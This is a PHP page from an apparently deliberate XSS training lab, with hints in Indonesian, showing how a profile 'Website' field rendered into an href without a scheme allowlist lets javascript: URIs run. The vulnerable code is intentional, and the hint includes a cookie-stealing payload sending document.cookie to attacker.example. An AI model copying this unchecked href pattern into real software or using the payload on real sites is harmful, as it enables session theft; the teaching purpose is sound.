<?php
$title = 'Lab 8: XSS via javascript: URI';
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['lab8_website'] = $_POST['website'] ?? '';
    header('Location: lab8_javascript_uri.php');
    exit;
}

$website = $_SESSION['lab8_website'] ?? '';

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: field "Website" di form edit profil ini disisipkan ke atribut
<code>href="..."</code> pada link "Kunjungi website saya" di bagian preview. Atributnya
di-escape dengan benar pakai <code>htmlspecialchars()</code>, jadi payload klasik seperti
<code>"&gt;&lt;script&gt;</code> TIDAK akan berhasil di sini — ini bukan bug missing-encoding
seperti Lab 2. Masalahnya: tidak ada pengecekan bahwa nilai yang dimasukkan harus diawali
<code>http://</code> atau <code>https://</code>. Browser tetap mengizinkan skema
<code>javascript:</code> sebagai nilai atribut <code>href</code> yang 100% valid dan
"aman" dari sisi HTML-encoding, tapi begitu link diklik, isi setelah <code>javascript:</code>
dieksekusi sebagai kode JavaScript dengan origin situs ini. Coba isi field Website dengan:</p>
<pre class="hint">javascript:alert(document.domain)</pre>
<p class="hint">atau simulasi pencurian cookie yang lebih realistis:</p>
<pre class="hint">javascript:fetch('https://attacker.example/steal?c='+document.cookie)</pre>
<p class="hint">Simpan profil, lalu klik link "Kunjungi website saya" di bagian preview di
bawah form.</p>
</details>

<form method="post">
  <label>Website</label><br>
  <input type="text" name="website" value="<?php echo htmlspecialchars($website, ENT_QUOTES); ?>" placeholder="https://situsku.com"><br>
  <button type="submit">Simpan Profil</button>
</form>

<?php if ($website !== ''): ?>
<h3>Preview profil Anda</h3>
<div class="result-box">
  Website: <a href="<?php echo htmlspecialchars($website, ENT_QUOTES); /* atribut sudah di-escape dengan benar, TAPI tidak ada allowlist skema (http/https) sehingga javascript: tetap lolos */ ?>">Kunjungi website saya</a>
</div>
<?php endif; ?>

<?php include 'footer.php'; ?>
